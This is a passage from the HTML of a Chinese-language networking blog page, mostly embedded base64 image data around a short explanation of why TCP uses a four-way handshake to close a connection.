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E8IH5Lke6/1rpK5rwh0ufqv9a6WgAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAiuv+PWX/AHD/ACrnvCP3rj6CuhuP+PeT/dP8q53wlxLc/QUAdPRRRQAUUUUAFFFFABRRRQAUhAPUZpaKAIHs7Z/vwRn6qKgfSbJukOw/7JIq9RQBmf2SUyYLy4jPYFsik8rVYR8ssMw/2lwa1KSgDL+1Xij/AEjT9wHdCDTBd6YDiaBYm9Hh/wDrVr0jKrDDKCPcUAUCLGeFzaLbNJg7cqOtc9ZW3iHT9PltorC3fzCxZxIAST3rppdLs5TkwKD6rwarnSXj5tryaL2J3CgCTRLD+ztJgtmA3ovzY9Tyav4FZiRarD0nhlA7MMGnfbL2L/XWLN7xtmgDSorMGtW6nEySxH/bWrMWoWkoBSdD7ZxQBaopAwYZBBFFAC0VVvbwWaozoxRmwWH8NWVYMoKnIPQ0ALRRRQAVWvxmxn/3D/KrNV77/jym/wBw/wAqAMPwkMC5x04/rXSVzPhHJNzk/wB3+tdNQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAR3H/HvJ/umud8Jf665+grpSARg9KjighhJMUSIT1KjGaAJaKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAGlQ3UA/WoJbC1m/wBZAhPrirNFAGY+i2+7dC0kJ/2WNKbG9j/1N8SB2dQa0qSgDEvJb6G3ZbpLeWMjB+baan8PvM1mRIDsB+Qn0qY6ZHJctNcMZsn5VbotXlUKAFAAHYUALRRRQAVXvv8Ajym/3D/KrFIQCMEZFAHNeED/AMfPp8v9a6amJFHHny0Vc9cDFPoAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAP/Z" alt="avatar"></p><h4><span id="tcp为什么需要四次挥手">TCP为什么需要四次挥手</span></h4><p>同样是面试中经常问的问题，简单来说就是当客户端发送FIN（断开连接）请求时服务器并不是马上断开连接，因为此时对方可能还处于数据的收发中，也就是说之前发送的数据可能还未接收完。</p><p>当客户端数据接收完毕后，会返回FIN和序号+1的回复表示已经接收完毕，可以断开连接了，此时服务收到这条回复才真的断开连接，借用一张图表示如下：</p><p><img src="data:image/jpeg;base64,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